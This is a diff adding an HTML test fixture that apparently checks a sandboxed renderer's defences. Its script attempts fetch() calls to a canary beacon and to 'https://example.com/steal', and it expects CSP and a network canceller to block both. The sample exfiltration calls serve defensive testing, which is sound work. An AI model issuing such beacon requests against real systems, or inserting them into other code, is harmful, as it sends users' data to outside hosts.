@@ -1,0 +1,17 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>attack: fetch</title>
+<!-- ATTACK: exfiltrate via fetch() to a canary and to a public origin.
+     Blocked by CSP connect-src 'none' (renderer) and, if that were removed, by
+     the request canceller + dead proxy (network). Canary must stay silent. -->
+<script>
+  const canary = (window.bridge.getArgs() || {}).canary || {};
+  (async () => {
+    const r = { attack: 'fetch' };
+    try { await fetch(canary.http + '/beacon?steal=1'); r.httpResolved = true; }
+    catch (e) { r.httpError = String(e); }
+    try { await fetch('https://example.com/steal'); r.httpsResolved = true; }
+    catch (e) { r.httpsError = String(e); }
+    window.bridge.emit('done', r);
+  })();
+</script>
